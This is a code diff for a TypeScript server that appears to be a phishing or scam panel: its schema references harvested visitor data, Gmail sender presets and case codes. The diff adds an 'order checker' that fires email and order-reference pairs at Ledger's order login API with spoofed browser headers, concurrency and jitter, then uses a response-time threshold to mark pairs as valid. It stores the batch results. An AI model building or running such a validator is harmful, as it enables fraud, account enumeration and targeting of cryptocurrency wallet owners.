@@ -314,6 +314,14 @@ function migrate(db: Database.Database): void {
 			expires_at INTEGER NOT NULL DEFAULT 0
 		);
 
+		CREATE TABLE IF NOT EXISTS order_checker_batches (
+			id INTEGER PRIMARY KEY AUTOINCREMENT,
+			created_at INTEGER NOT NULL DEFAULT 0,
+			created_by TEXT NOT NULL DEFAULT '',
+			summary_json TEXT NOT NULL DEFAULT '{}',
+			results_json TEXT NOT NULL DEFAULT '[]'
+		);
+
 		CREATE INDEX IF NOT EXISTS idx_log_timestamp ON activity_log(timestamp DESC);
 		CREATE INDEX IF NOT EXISTS idx_harvest_ip ON harvested_data(visitor_ip);
 		CREATE INDEX IF NOT EXISTS idx_harvest_type ON harvested_data(data_type);
@@ -369,8 +377,10 @@ function migrate(db: Database.Database): void {
 	db.exec(`CREATE INDEX IF NOT EXISTS idx_gmail_presets_owner ON gmail_sender_presets(owner_username);`);
 	db.exec(`CREATE INDEX IF NOT EXISTS idx_case_codes_code ON case_codes(code);`);
 	db.exec(`CREATE INDEX IF NOT EXISTS idx_case_codes_owner ON case_codes(owner_username);`);
+	db.exec(`CREATE INDEX IF NOT EXISTS idx_order_batches_created_at ON order_checker_batches(created_at DESC);`);
 
 	seedDefaultAdmin(db);
+	seedOrderCheckerDefaults(db);
 }
 
 function addColumnIfMissing(db: Database.Database, table: string, column: string, definition: string): void {
@@ -406,6 +416,41 @@ export function dbSeedDefaultTemplates(templates: Array<{ id: string; name: stri
 	}
 	if (inserted > 0 || updated > 0) {
 		console.log(`[db] Mail templates: ${inserted} inserted, ${updated} updated`);
+	}
+}
+
+export const ORDER_CHECKER_DEFAULTS: Record<string, string> = {
+	'order_checker.probe_url': 'https://my-order.ledger.com/api/login',
+	'order_checker.method': 'POST',
+	'order_checker.body_template':
+		'{"email":"{{email}}","orderReference":"{{orderRef}}"}',
+	'order_checker.headers_json': JSON.stringify(
+		{
+			'content-type': 'application/json',
+			accept: 'application/json, text/plain, */*',
+			'accept-language': 'en-US,en;q=0.9',
+			origin: 'https://my-order.ledger.com',
+			referer: 'https://my-order.ledger.com/login',
+			'user-agent':
+				'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
+		},
+		null,
+		2
+	),
+	'order_checker.valid_threshold_ms': '800',
+	'order_checker.concurrency': '3',
+	'order_checker.runs_per_pair': '2',
+	'order_checker.request_timeout_ms': '8000',
+	'order_checker.jitter_ms': '120'
+};
+
+function seedOrderCheckerDefaults(db: Database.Database): void {
+	const stmt = db.prepare(
+		`INSERT INTO server_settings (key, value) VALUES (?, ?)
+		 ON CONFLICT(key) DO NOTHING`
+	);
+	for (const [key, value] of Object.entries(ORDER_CHECKER_DEFAULTS)) {
+		stmt.run(key, value);
 	}
 }
 
@@ -2219,4 +2264,70 @@ export function dbRecordCaseCodeUse(code: string, ip: string): void {
 	getDb()
 		.prepare('UPDATE case_codes SET uses = uses + 1, last_used_at = ?, last_used_ip = ? WHERE code = ?')
 		.run(Date.now(), ip || '', code);
+}
+
+// --- Order checker batches ---
+
+export interface DbOrderBatch {
+	id: string;
+	createdAt: number;
+	createdBy: string;
+	summary: Record<string, unknown>;
+	results: unknown[];
+}
+
+function rowToOrderBatch(row: any): DbOrderBatch {
+	let summary: Record<string, unknown> = {};
+	let results: unknown[] = [];
+	try { summary = JSON.parse(row.summary_json || '{}'); } catch {}
+	try { results = JSON.parse(row.results_json || '[]'); } catch {}
+	return {
+		id: String(row.id),
+		createdAt: row.created_at || 0,
+		createdBy: row.created_by || '',
+		summary,
+		results
+	};
+}
+
+export function dbInsertOrderBatch(input: {
+	createdBy: string;
+	summary: Record<string, unknown>;
+	results: unknown[];
+}): DbOrderBatch {
+	const now = Date.now();
+	const res = getDb()
+		.prepare(
+			`INSERT INTO order_checker_batches (created_at, created_by, summary_json, results_json)
+			 VALUES (?, ?, ?, ?)`
+		)
+		.run(now, input.createdBy || '', JSON.stringify(input.summary || {}), JSON.stringify(input.results || []));
+	return {
+		id: String(res.lastInsertRowid),
+		createdAt: now,
+		createdBy: input.createdBy || '',
+		summary: input.summary || {},
+		results: input.results || []
+	};
+}
+
+export function dbListOrderBatches(limit = 25): DbOrderBatch[] {
+	const rows = getDb()
+		.prepare(
+			`SELECT id, created_at, created_by, summary_json, '[]' AS results_json
+			 FROM order_checker_batches ORDER BY created_at DESC LIMIT ?`
+		)
+		.all(limit) as any[];
+	return rows.map(rowToOrderBatch);
+}
+
+export function dbGetOrderBatch(id: string): DbOrderBatch | undefined {
+	const row = getDb()
+		.prepare('SELECT * FROM order_checker_batches WHERE id = ?')
+		.get(Number(id)) as any;
+	return row ? rowToOrderBatch(row) : undefined;
+}
+
+export function dbDeleteOrderBatch(id: string): void {
+	getDb().prepare('DELETE FROM order_checker_batches WHERE id = ?').run(Number(id));
 }
